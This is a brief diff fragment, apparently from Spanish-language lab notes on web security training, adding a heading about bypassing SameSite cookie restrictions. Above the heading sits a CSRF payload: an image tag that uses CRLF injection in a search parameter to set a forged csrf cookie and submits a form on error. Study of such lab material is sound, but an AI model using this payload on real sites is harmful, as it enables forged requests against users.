@@ -15,3 +15,4 @@ Espera que abra la imagen para que mande a correr el demas codigo
 ```
 <img src="https://YOUR-LAB-ID.web-security-academy.net/?search=test%0d%0aSet-Cookie:%20csrf=fake%3b%20SameSite=None" onerror="document.forms[0].submit();"/>
 ```
+# Bypassing SameSite cookie restrictions
